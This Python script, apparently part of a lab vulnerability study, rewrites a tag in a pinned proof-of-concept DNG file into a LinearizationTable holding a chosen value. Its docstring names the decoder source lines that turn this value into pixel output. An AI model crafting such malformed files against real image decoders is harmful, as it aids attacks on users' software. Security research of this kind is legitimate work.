#!/usr/bin/env python3
"""Lab-only W11: add DNG LinearizationTable (tag 0xc618) as a value knob.

The pinned MiniDNG PoC has an unused TIFF 0x00fe entry (LONG, count 1, value 0)
at IFD slot 2. This generator rewrites that slot as 0xc618 SHORT count 1 with
the requested table value. Pinned binding: src/metadata/tiff.cpp:1109-1113
parses the tag via linear_table(len); src/utils/curves.cpp:145-155 reads len
shorts into curve[] and extends curve[len-1] over the remaining entries;
src/decoders/dng.cpp:34-51 stores curve[raw] into every decoded pixel.

usage: craft_linearization_poc.py SRC DST VALUE
"""
import struct
import sys

src, dst = sys.argv[1:3]
value = int(sys.argv[3], 0)
assert 0 <= value <= 65535
d = bytearray(open(src, "rb").read())
assert d[:2] == b"II"
ifd = struct.unpack_from("<I", d, 4)[0]
n = struct.unpack_from("<H", d, ifd)[0]
found = False
for i in range(n):
    e = ifd + 2 + 12 * i
    tag, typ, cnt = struct.unpack_from("<HHI", d, e)
    if tag == 0x00FE:
        assert typ == 4 and cnt == 1
        assert struct.unpack_from("<I", d, e + 8)[0] == 0
        struct.pack_into("<HHI", d, e, 0xC618, 3, 1)
        struct.pack_into("<HH", d, e + 8, value, 0)
        found = True
    elif tag == 0xC618:
        assert typ == 3 and cnt == 1
        struct.pack_into("<H", d, e + 8, value)
        found = True
assert found
open(dst, "wb").write(d)
print(f"wrote {dst} LinearizationTable={value:#06x}")
